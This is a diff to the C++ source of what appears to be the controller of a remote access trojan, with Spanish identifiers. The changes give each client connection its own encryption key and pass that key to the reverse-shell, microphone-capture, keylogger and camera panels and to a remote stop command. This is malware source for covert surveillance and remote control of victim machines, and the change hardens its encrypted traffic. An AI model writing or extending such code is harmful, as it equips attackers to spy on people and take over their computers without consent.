@@ -960,15 +960,7 @@ void Servidor::m_AgregarListener(const std::string _nuevo_nombre, int _puerto, c
     memset(nuevo_listener.con_key, 0, AES_KEY_LEN+1);
 
     strncpy(nuevo_listener.con_key, _con_key, AES_KEY_LEN);
-    //strncpy_s(&nuevo_listener.con_key[0], AES_KEY_LEN, _con_key, AES_KEY_LEN);
-
-    //if (this->Init_Socket(nuevo_listener.sckSocket, _puerto, nuevo_listener.struct_Listener)) {
-    //FD_SET(nuevo_listener.sckSocket, &this->fd_Master);
-    //nuevo_listener.isRunning = true;
     this->vc_Listeners.push_back(nuevo_listener);
-    //}else {
-    //    wxMessageBox("Error: No se pudo crear el socket del nuevo listener");
-    //}
 }
 
 void Servidor::m_BorrarListener(const std::string _nombre_listener) {
@@ -1252,7 +1244,7 @@ void Servidor::m_RemoverClienteLista(std::string p_ID){
     
 }
 
-int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
+int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
     //Aqui hacer loop para enviar por partes el buffer
     int iEnviado      =    0;
     int iRestante     =    0;
@@ -1300,7 +1292,7 @@ int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFl
 
             this->m_SerializarPaquete(nPaquete, cPaqueteSer);
 
-            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, ntemp_mutex, isBlock, 0);
+            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, ntemp_mutex, isBlock, 0, c_key);
             if (iChunkEnviado == SOCKET_ERROR || iChunkEnviado == WSAECONNRESET) {
                 DEBUG_MSG("[CHUNK] Error enviando el chunk");
                 return iChunkEnviado;
@@ -1343,7 +1335,7 @@ int Servidor::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlag
     return iTotalEnviado;
 }
 
-int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, std::mutex*& mtx_obj, bool isBlock, int iTipoPaquete) {
+int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, std::mutex*& mtx_obj, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
     // 1 non block
     // 0 block
     std::mutex* tmp_mutex;
@@ -1358,7 +1350,7 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     int iDataSize = pLen;
 
     //Vector que aloja el buffer cifrado
-    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize, this->bKey);
+    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize, c_key);
     iDataSize = cData.size();
     if (iDataSize == 0) {
         ERROR_EW("Error encriptando los datos a enviar");
@@ -1862,15 +1854,16 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     const int menuID = event.GetId();
 
     SOCKET tmpSocket = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._sckCliente;
+    ByteArray& c_key = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente.c_key;
 
     if (menuID == EnumMenuMods::ID_OnShell) {
-        panelReverseShell* panelShell = new panelReverseShell(this, tmpSocket, this->strTmp.ToStdString());
+        panelReverseShell* panelShell = new panelReverseShell(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelShell->Show();
     } else if (menuID == EnumMenuMods::ID_OnMicrofono) {
-        panelMicrophone* panelMic = new panelMicrophone(this, tmpSocket, this->strTmp.ToStdString());
+        panelMicrophone* panelMic = new panelMicrophone(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelMic->Show();
     }else if (menuID == EnumMenuMods::ID_OnKeyloger) {
-        panelKeylogger* panelKey = new panelKeylogger(this, tmpSocket, this->strTmp.ToStdString());
+        panelKeylogger* panelKey = new panelKeylogger(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelKey->Show();
     }
     else if (menuID == EnumMenuMods::ID_OnCamara) {
@@ -1903,7 +1896,7 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     }
     //Comandos de cliente, cerrar, reiniciar, actualizar, desinstalar
     else if (menuID == EnumIDS::ID_CerrarProceso) {
-        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
+        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP, c_key);
         p_Servidor->m_CerrarConexion(tmpSocket);
     } 
 }
